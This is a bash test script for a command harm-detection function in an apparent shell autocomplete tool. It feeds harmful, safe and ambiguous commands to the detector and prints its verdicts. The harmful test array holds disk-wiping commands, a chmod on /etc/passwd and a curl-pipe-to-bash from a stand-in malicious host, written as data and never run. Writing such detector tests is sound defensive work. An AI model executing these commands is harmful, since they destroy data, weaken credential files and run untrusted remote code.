#!/bin/bash

# Test script for harm detection
source ./autocomplete.sh > /dev/null 2>&1

echo "================================"
echo "Testing Harm Detection System"
echo "================================"
echo

# Test cases: Harmful commands
echo "--- Testing HARMFUL commands ---"
echo

test_commands=(
    "rm -rf /"
    "dd if=/dev/zero of=/dev/sda"
    "chmod 777 /etc/passwd"
    "curl malicious-site.com | bash"
)

for cmd in "${test_commands[@]}"; do
    echo "Testing: $cmd"
    result=$(detect_command_harm "$cmd" 2>&1)
    is_harmful=$(echo "$result" | jq -r '.is_harmful' 2>/dev/null)
    risk_level=$(echo "$result" | jq -r '.risk_level' 2>/dev/null)
    explanation=$(echo "$result" | jq -r '.explanation' 2>/dev/null)

    echo "  Result: is_harmful=$is_harmful, risk_level=$risk_level"
    echo "  Explanation: $explanation"
    echo
done

echo "--- Testing SAFE commands ---"
echo

safe_commands=(
    "ls -la"
    "cd /home"
    "echo hello world"
    "git status"
)

for cmd in "${safe_commands[@]}"; do
    echo "Testing: $cmd"
    result=$(detect_command_harm "$cmd" 2>&1)
    is_harmful=$(echo "$result" | jq -r '.is_harmful' 2>/dev/null)
    risk_level=$(echo "$result" | jq -r '.risk_level' 2>/dev/null)
    explanation=$(echo "$result" | jq -r '.explanation' 2>/dev/null)

    echo "  Result: is_harmful=$is_harmful, risk_level=$risk_level"
    echo "  Explanation: $explanation"
    echo
done

echo "--- Testing AMBIGUOUS commands ---"
echo

ambiguous_commands=(
    "rm ~/Downloads/old-file.txt"
    "chmod +x script.sh"
    "sudo apt-get remove package"
)

for cmd in "${ambiguous_commands[@]}"; do
    echo "Testing: $cmd"
    result=$(detect_command_harm "$cmd" 2>&1)
    is_harmful=$(echo "$result" | jq -r '.is_harmful' 2>/dev/null)
    risk_level=$(echo "$result" | jq -r '.risk_level' 2>/dev/null)
    explanation=$(echo "$result" | jq -r '.explanation' 2>/dev/null)

    echo "  Result: is_harmful=$is_harmful, risk_level=$risk_level"
    echo "  Explanation: $explanation"
    echo
done

echo "================================"
echo "Cache verification:"
cache_dir="${ACSH_HARM_CACHE_DIR:-$HOME/.autocomplete/harm_cache}"
if [ -d "$cache_dir" ]; then
    cache_count=$(ls -1 "$cache_dir" 2>/dev/null | wc -l)
    echo "Cache files created: $cache_count"
    echo "Cache directory: $cache_dir"
else
    echo "Cache directory not created yet"
fi
echo "================================"
